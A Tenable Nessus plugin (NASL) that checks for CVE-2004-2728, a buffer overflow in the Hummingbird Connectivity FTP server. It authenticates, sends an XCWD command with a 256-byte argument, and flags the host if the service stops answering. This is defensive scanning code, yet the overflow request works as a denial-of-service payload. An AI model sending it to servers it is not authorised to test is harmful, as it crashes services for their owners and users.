#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(15613);
 script_version("$Revision: 1.15 $");

 script_cve_id("CVE-2004-2728");
 script_bugtraq_id(11542);
 script_osvdb_id(11133);
 script_xref(name:"Secunia", value:12984);

 script_name(english:"Hummingbird Connectivity FTP Service XCWD Command Overflow");

 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the Hummingbird Connectivity FTP server.

It was possible to shut down the remote FTP server by issuing a XCWD
command followed by a too long argument.

This problem allows an attacker to prevent the remote site
from sharing some resources with the rest of the world." );
 script_set_attribute(attribute:"see_also", value:"http://connectivity.hummingbird.com/" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:S/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(119);

 script_set_attribute(attribute:"plugin_publication_date", value: "2004/11/03");
 script_cvs_date("$Date: 2011/11/28 21:39:45 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Attempts a XCWD buffer overflow");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2004-2011 Tenable Network Security, Inc.");
 script_family(english:"FTP");
 script_dependencie("ftp_anonymous.nasl", "ftpserver_detect_type_nd_version.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 
 exit(0);
}

#
# The script code starts here
#

include("ftp_func.inc");

port = get_ftp_port(default: 21);

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

soc = open_sock_tcp(port);
if (!soc) exit(1);

if(! ftp_authenticate(socket:soc, user:login, pass:password))
{
  close(soc);
  exit(0);
}

s = "XCWD "+ crap(256) +'\r\n';
send(socket:soc, data:s);
r = recv_line(socket:soc, length:1024);
close(soc);

for (i = 0; i < 3; i ++)
{       
 soc = open_sock_tcp(port);
 if(soc)
 {
   close(soc);
   exit(0);
 }
 sleep(1);
}

security_note(port);
